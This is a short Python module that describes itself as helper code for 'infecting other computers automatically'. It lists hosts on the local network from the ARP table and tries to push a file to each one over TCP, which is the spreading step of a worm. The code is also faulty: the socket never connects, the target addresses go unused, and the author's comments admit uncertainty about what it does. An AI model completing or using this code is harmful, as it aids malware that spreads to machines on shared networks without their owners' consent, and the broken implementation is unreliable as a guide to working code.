"""Helper functions for infecting other computers automatically."""

import subprocess
import re
import socket


def FormatARPTable():
    connected = subprocess.getoutput(["arp","-a"])
    # uses arp (windows tool) to get all connected devices, but needs checking
    # below this comment is formatting code to format all stuff into list
    formatted = {}
    for line in re.findall('([-.0-9]+)\\s+([-0-9a-f]{17})\\s+(\\w+)',connected):
        # regex from this link on StackOverflow: https://stackoverflow.com/questions/59857314/how-can-i-get-the-arp-table-from-a-windows-machine-using-python
        # don't delete double slashes, used as escape character representing '\'
        formatted[line[0]] = line[1],line[2]
    return formatted


def TransferWithTCP(url: str,path_to_file: str):
    # transfers file into other computers through TCP
    with open(path_to_file,"rb") as f:
        packet = f.read(65536)
        conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        # max size you can send through TCP
        for ip in FormatARPTable().keys():
            conn.send(packet)
            # not quite sure what this does yet:
            # TODO:
            # - find what this actually does and if it downloads
            # - see if this is basically FTP